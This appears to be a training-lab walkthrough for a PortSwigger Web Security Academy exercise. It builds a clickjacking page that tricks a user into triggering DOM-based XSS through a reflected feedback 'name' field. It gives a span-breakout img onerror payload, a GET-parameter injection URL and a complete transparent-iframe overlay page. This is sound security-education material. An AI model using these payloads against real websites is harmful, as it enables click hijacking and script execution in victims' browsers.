
# Exploiting clickjacking vulnerability to trigger DOM-based XSS

This lab contains an XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the "Click me" button to call the print() function.

Note: The victim will be using Chrome so test your exploit on that browser.


---------------------------------------------

References: 

- https://portswigger.net/web-security/clickjacking



![img](images/Exploiting%20clickjacking%20vulnerability%20to%20trigger%20DOM-based%20XSS/1.png)

---------------------------------------------

There is a function to submit feedback:



![img](images/Exploiting%20clickjacking%20vulnerability%20to%20trigger%20DOM-based%20XSS/2.png)


It reflects the content of the name field:



![img](images/Exploiting%20clickjacking%20vulnerability%20to%20trigger%20DOM-based%20XSS/3.png)


It is inside a span tag:



![img](images/Exploiting%20clickjacking%20vulnerability%20to%20trigger%20DOM-based%20XSS/4.png)


We can exploit the XSS using the payload:

```
</span><img src=x onerror=alert(1)><span>
```



![img](images/Exploiting%20clickjacking%20vulnerability%20to%20trigger%20DOM-based%20XSS/5.png)


The fields can be populated using GET parameters:

```
/feedback?name=</span><img src=x onerror=alert(1)><span>&email=a@a.com&subject=a&message=a
```



![img](images/Exploiting%20clickjacking%20vulnerability%20to%20trigger%20DOM-based%20XSS/6.png)


So we can execute the attack with a payload like this:

```
<head>
	<style>
		#target_website {
			position:relative;
			width:600px;
			height:600px;
			opacity:0.1;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:600px;
			height:600px;
			z-index:1;
			}
		#btn {
			position:absolute;
			top:440px;
			left:70px;
		}
	</style>
</head>
<body>
	<div id="decoy_website">
	<button id="btn">Click me</button>
	</div>
	<iframe id="target_website" src="https://0a9500e703977b7c812c80ce00300073.web-security-academy.net/feedback?name=%3C/span%3E%3Cimg%20src=x%20onerror=print()%3E%3Cspan%3E&email=a@a.com&subject=a&message=a">
	</iframe>
</body>
```



![img](images/Exploiting%20clickjacking%20vulnerability%20to%20trigger%20DOM-based%20XSS/7.png)